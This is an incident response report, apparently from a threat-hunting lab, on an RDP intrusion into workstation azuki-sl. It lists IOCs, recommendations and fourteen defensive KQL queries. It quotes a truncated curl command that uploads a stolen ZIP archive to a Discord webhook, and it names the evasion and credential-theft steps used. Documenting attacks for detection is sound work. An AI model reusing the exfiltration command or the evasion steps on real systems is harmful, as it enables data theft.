INCIDENT RESPONSE REPORT
Report ID: IR-2025-11-19-AZUKI-01
Analyst: Michael Bernal 
Investigation Date: November 23, 2025
Incident Date: 19-November-2025
Severity: Critical
Status: Contained

EXECUTIVE SUMMARY
On November 19, 2025, the IT Admin workstation azuki-sl was compromised by the threat actor JADE SPIDER. The attacker gained initial access via Remote Desktop (RDP) using compromised credentials belonging to user kenji.sato. Once inside, the attacker disabled Windows Defender, staged malicious tools in a hidden directory, and harvested system credentials using Mimikatz. Corporate data was archived and exfiltrated via a Discord webhook. The attacker established persistence using a Scheduled Task masquerading as a Windows Update and attempted lateral movement to an internal server (10.1.0.188). All malicious access has been identified and isolated.

INCIDENT DETAILS
Timeline
First activity: 2025-11-19 10:36:21 (RDP Login)
Last activity: 2025-11-19 11:45:00 (Log Clearing & Lateral Movement)
Dwell Time: ~1 hour 10 minutes
Attack Overview
Affected system: azuki-sl (IT Admin Workstation)
Affected user: kenji.sato (Compromised), support (Backdoor created by attacker)
Attacker IP: 88.97.178.12 (Initial Access), 78.141.196.6 (C2)
Attack Chain
RDP Access —> Defender Exclusion —> Tool Download (certutil) —> Credential Dump (mimikatz) —> Exfiltration (discord) —> Persistence (schtasks).

<img width="614" height="629" alt="Table" src="https://github.com/user-attachments/assets/6880e656-e55e-4cf9-ad10-172a0f1295b2" />
<img width="605" height="348" alt="Table2" src="https://github.com/user-attachments/assets/ee0413b1-5d7b-4892-8e63-a3972b5c582d" />

KEY FINDINGS
IOCs (Indicators of Compromise)
IPs
88.97.178.12 (Attacker Source - RDP)
78.141.196.6 (C2 Server - Malicious svchost.exe)
Domains
discord.com / discordapp.com (Used for exfiltration)
File Hashes / Names
C:\ProgramData\WindowsCache\svchost.exe (Backdoor)
C:\ProgramData\WindowsCache\mm.exe (Renamed Mimikatz)
C:\Users\kenji.sato\AppData\Local\Temp\wupdate.bat (Launcher)
C:\Users\kenji.sato\AppData\Local\Temp\wupdate.ps1 (Script)
export-data.zip (Stolen Data)
Accounts
support (Local Admin created by attacker)

RECOMMENDATIONS
Right Now
Isolate: Disconnect azuki-sl from the network immediately.
Block: Block IP 88.97.178.12 and 78.141.196.6 at the firewall.
Disable Accounts: Reset password for kenji.sato and delete the support local account.
Investigate Lateral Target: Immediately examine 10.1.0.188 logs for successful logins from azuki-sl.
This Week
Credential Rotation: Force a global password reset for all administrators (due to Mimikatz usage).
Hunt: Run the provided KQL queries across the entire fleet to check if C:\ProgramData\WindowsCache exists on other machines.
DLP: Review firewall logs for other connections to discord.com originating from servers.
Later
RDP Security: Disable RDP exposure to the internet. Require VPN + MFA for all remote access.
ASR Rules: Enable Attack Surface Reduction rules to block certutil and curl from downloading files on servers.

Evidence - KQL Queries & Screenshots

Query 1: Identifying Source IP via Network Logs
Goal: Correlating a timestamp to a network connection to find the attacker's IP.
DeviceNetworkEvents
| where Timestamp between (datetime(2025-11-19 10:00:00) .. datetime(2025-11-19 11:00:00))
| where DeviceName == "azuki-sl"
| where ActionType == "InboundConnectionAccepted"
| where LocalPort == 3389
| project Timestamp, RemoteIP, RemotePort, LocalIP, Protocol

<img width="522" height="327" alt="KQLResults1" src="https://github.com/user-attachments/assets/233ef5d1-ad84-41a8-8551-7e4bd6a43762" />

Query 2: Discovery & Reconnaissance
Goal: Detecting commands used by the attacker to map the local network (ARP table).
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-19 10:36:00) .. datetime(2025-11-19 11:00:00))
| where DeviceName == "azuki-sl"
| where AccountName == "kenji.sato"
| project Timestamp, FileName, ProcessCommandLine, FolderPath
| order by Timestamp asc

<img width="627" height="172" alt="KQLResults2" src="https://github.com/user-attachments/assets/589f4240-aeff-49a8-bb6c-a25f8bd093d9" />

Commands like ARP.EXE and whoami.exe were used to map the compromised system’s identity as well as the surroundings of the local network.
Query 3: Staging & Hiding Data
Goal: Detecting the creation of hidden directories used to store malware and stolen data.
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-19 10:30:00) .. datetime(2025-11-19 11:30:00))
| where DeviceName == "azuki-sl"
| where FileName in ("cmd.exe", "attrib.exe")
| where ProcessCommandLine has "mkdir" or ProcessCommandLine has "attrib"
| project Timestamp, ProcessCommandLine
| order by Timestamp asc

The following command indicated the location of the hidden directory as well as the exfiltration of data: -F file=@C:\ProgramData\WindowsCache\export-data.zip

Query 4: Defense Evasion (Extension Exclusions)
Goal: Identifying changes to the Registry that whitelist specific file extensions from Windows Defender scanning.
DeviceRegistryEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where ActionType == "RegistryValueSet"
| where RegistryKey has "Windows Defender\\Exclusions\\Extensions" 
| project Timestamp, RegistryKey, RegistryValueName, RegistryValueData

The results showed three unique file extensions under the RegistryValueName column. 
Query 5: Defense Evasion (Path Exclusions)
Goal: Identifying specific folder paths that were whitelisted to hide the attacker's staging directory.
DeviceRegistryEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where ActionType == "RegistryValueSet"
| where RegistryKey has "Windows Defender\\Exclusions\\Paths" 
| project Timestamp, RegistryKey, RegistryValueName, RegistryValueData

C:\Users\KENJI~1.SAT\AppData\Local\Temp

Query 6: Malicious Tool Download (LOLBins)
Goal: Detecting legitimate Windows tools (like certutil or curl) being used to download files from the internet.
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where ProcessCommandLine contains "http"
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp asc

Certutil.exe was used to download the malicious files.

Query 7: Persistence via Scheduled Tasks
Goal: Identifying the creation of malicious scheduled tasks designed to maintain access after a reboot.
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where FileName == "schtasks.exe"
| where ProcessCommandLine contains "/create"
| project Timestamp, ProcessCommandLine

<img width="627" height="43" alt="Screenshot (209)" src="https://github.com/user-attachments/assets/e4a73f69-3a1b-4d30-a7fb-b057ddc86654" />

Windows Update Check stood out as the mechanism of persistence. 

Query 8: Command & Control (C2) Traffic
Goal: Identifying outbound network connections initiated by the malware located in the staging folder.
DeviceNetworkEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where InitiatingProcessFolderPath has "WindowsCache"
| project Timestamp, InitiatingProcessFileName, RemoteIP, RemotePort, RemoteUrl
| order by Timestamp asc

This query revealed the “command center” the attacker was reporting back to. 78.141.196.6 via port 443 to hide amongst normal network traffic.

Query 9: Credential Dumping Verification
Goal: Searching for renamed credential theft tools (like Mimikatz) based on short filenames.
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where FolderPath has "WindowsCache"
| where strlen(FileName) < 7 
| project Timestamp, FileName, ProcessCommandLine

mm.exe was revealed in a previous query and confirmed here which is a truncated version of Mimikatz.

Query 10: Data Collection (Archiving)
Goal: Detecting the creation of ZIP files used to bundle stolen data before exfiltration.
DeviceFileEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where FolderPath has "WindowsCache"
| where FileName endswith ".zip"
| project Timestamp, FileName, FolderPath, ActionType

"curl.exe" -F file=@C:\ProgramData\WindowsCache\export-data.zip …
This curl command was used to exfiltrate data as a .zip file via Discord.

Query 11: Data Exfiltration (Cloud Service)
Goal: Identifying the use of curl to upload data to external webhooks (Discord).
DeviceNetworkEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where InitiatingProcessFileName == "curl.exe"
| project Timestamp, RemoteUrl, RemoteIP

Confirmed in the same previous screenshot: "curl.exe" -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord....
Query 12: Anti-Forensics (Log Clearing)
Goal: Detecting the execution of wevtutil to clear Windows Event Logs and hide tracks.
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where FileName == "wevtutil.exe"
| project Timestamp, ProcessCommandLine
| order by Timestamp asc

This query reveals an attempt by the attacker to clear the security logs.

<img width="632" height="157" alt="Screenshot (210)" src="https://github.com/user-attachments/assets/f1091ea6-f358-4e9b-9e8e-412c3a6a968d" />

Query 13: Initial Attack Script
Goal: Finding the initial PowerShell or Batch scripts created in the user's Temp directory.
DeviceFileEvents
| where Timestamp between (datetime(2025-11-19 10:30:00) .. datetime(2025-11-19 11:00:00))
| where DeviceName == "azuki-sl"
| where FolderPath has "Temp"
| where FileName endswith ".ps1" or FileName endswith ".bat"
| project Timestamp, FolderPath, FileName, ActionType
| order by Timestamp asc

The attacker’s initial Powershell script created in the Temp directory: wupdate.ps1.

<img width="633" height="248" alt="Screenshot (211)" src="https://github.com/user-attachments/assets/8a09a207-c7ec-4582-8921-898d5cd2aece" />

Query 14: Lateral Movement
Goal: Identifying attempts to move to other systems using stored credentials (cmdkey) or Remote Desktop (mstsc).
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName == "azuki-sl"
| where FileName in ("cmdkey.exe", "mstsc.exe")
| project Timestamp, FileName, ProcessCommandLine
| order by Timestamp asc

Revealed an unsuccessful attempt at lateral movement to the following IP address:  10.1.0.188


